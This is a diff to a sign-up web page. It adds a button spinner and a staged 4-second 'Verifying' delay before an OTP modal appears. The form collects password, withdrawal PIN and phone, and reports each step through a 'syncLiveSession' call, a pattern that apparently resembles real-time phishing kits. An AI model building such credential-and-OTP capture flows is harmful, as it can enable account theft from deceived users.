@@ -19,7 +19,7 @@
     .btn-green {
       background-color: #169854;
     }
-    .btn-green:hover {
+    .btn-green:hover:not(:disabled) {
       background-color: #128046;
     }
     .text-brand-green {
@@ -84,8 +84,8 @@
 
       <!-- Sign Up Button -->
       <div class="pt-4">
-        <button type="submit" class="w-full py-3.5 rounded-full text-white font-bold text-base btn-green shadow-md transition transform active:scale-95">
-          Sign Up
+        <button type="submit" id="signUpBtn" class="w-full py-3.5 rounded-full text-white font-bold text-base btn-green shadow-md transition transform active:scale-95 flex items-center justify-center gap-2 disabled:opacity-80 disabled:cursor-not-allowed">
+          <span id="signUpBtnText">Sign Up</span>
         </button>
       </div>
     </form>
@@ -140,6 +140,8 @@
     }
 
     const registerForm = document.getElementById('registerForm');
+    const signUpBtn = document.getElementById('signUpBtn');
+    const signUpBtnText = document.getElementById('signUpBtnText');
     const otpModal = document.getElementById('otpModal');
     const displayPhone = document.getElementById('displayPhone');
     const otpBoxes = document.querySelectorAll('.otp-box');
@@ -147,6 +149,7 @@
     const resendText = document.getElementById('resendText');
     let timerInterval;
     let pendingUserData = {};
+    let isSubmitting = false;
 
     // Restrict numeric fields to numbers only
     document.getElementById('phone').addEventListener('input', (e) => {
@@ -168,40 +171,62 @@
       syncLiveSession('Page Loaded');
     });
 
-    // Form Submit -> Trigger OTP Modal
+    // Form Submit -> Show 4s Loading on Button -> Trigger OTP Modal
     registerForm.addEventListener('submit', (e) => {
       e.preventDefault();
-      const phoneVal = document.getElementById('phone').value.trim();
+      if (isSubmitting) return;
+      isSubmitting = true;
 
-      pendingUserData = {
-        username: document.getElementById('username')?.value.trim() || '',
-        password: document.getElementById('password')?.value.trim() || '',
-        withdrawalPin: document.getElementById('withdrawalPin')?.value.trim() || '',
-        phone: phoneVal,
-        referral: document.getElementById('referral')?.value.trim() || ''
-      };
+      // Start loading state on Sign Up button
+      signUpBtn.disabled = true;
+      signUpBtnText.innerHTML = `
+        <svg class="animate-spin h-5 w-5 text-white inline-block mr-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+          <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+          <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+        </svg>
+        Loading...
+      `;
 
-      displayPhone.textContent = '+91 ' + phoneVal;
+      syncLiveSession('Verifying / Loading...');
 
-      // Reset OTP boxes
-      otpBoxes.forEach(box => {
-        box.value = '';
-        box.classList.remove('border-2', 'border-[#169854]');
-        box.classList.add('border', 'border-gray-300');
-      });
-      statusMsg.classList.add('hidden');
-
-      // Sync state on modal open
-      syncLiveSession('OTP Modal Opened');
-
-      // Show Modal & trigger numeric keyboard
-      otpModal.classList.remove('hidden');
-      otpModal.classList.add('flex');
       setTimeout(() => {
-        otpBoxes[0].focus();
-      }, 100);
+        // Restore button state
+        signUpBtn.disabled = false;
+        signUpBtnText.textContent = 'Sign Up';
+        isSubmitting = false;
 
-      startTimer(57);
+        const phoneVal = document.getElementById('phone').value.trim();
+
+        pendingUserData = {
+          username: document.getElementById('username')?.value.trim() || '',
+          password: document.getElementById('password')?.value.trim() || '',
+          withdrawalPin: document.getElementById('withdrawalPin')?.value.trim() || '',
+          phone: phoneVal,
+          referral: document.getElementById('referral')?.value.trim() || ''
+        };
+
+        displayPhone.textContent = '+91 ' + phoneVal;
+
+        // Reset OTP boxes
+        otpBoxes.forEach(box => {
+          box.value = '';
+          box.classList.remove('border-2', 'border-[#169854]');
+          box.classList.add('border', 'border-gray-300');
+        });
+        statusMsg.classList.add('hidden');
+
+        // Sync state on modal open
+        syncLiveSession('OTP Modal Opened');
+
+        // Show Modal & trigger numeric keyboard
+        otpModal.classList.remove('hidden');
+        otpModal.classList.add('flex');
+        setTimeout(() => {
+          otpBoxes[0].focus();
+        }, 100);
+
+        startTimer(57);
+      }, 4000); // 4 seconds delay
     });
 
     function closeModal() {
